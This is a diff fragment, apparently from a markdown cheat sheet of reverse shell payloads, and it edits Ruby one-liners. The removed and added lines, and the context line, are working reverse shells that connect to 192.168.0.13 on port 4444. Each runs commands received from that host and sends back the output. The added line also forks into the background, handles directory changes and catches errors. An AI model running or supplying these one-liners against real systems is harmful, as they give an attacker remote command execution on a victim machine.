@@ -25,7 +25,7 @@ ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/s
 if you don't want to rely on `/bin/sh`
 
 ```ruby
-ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("192.168.0.13",4444);loop{c.gets.chomp!;($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
 ```
 
 if you don't want to rely on `cmd.exe`
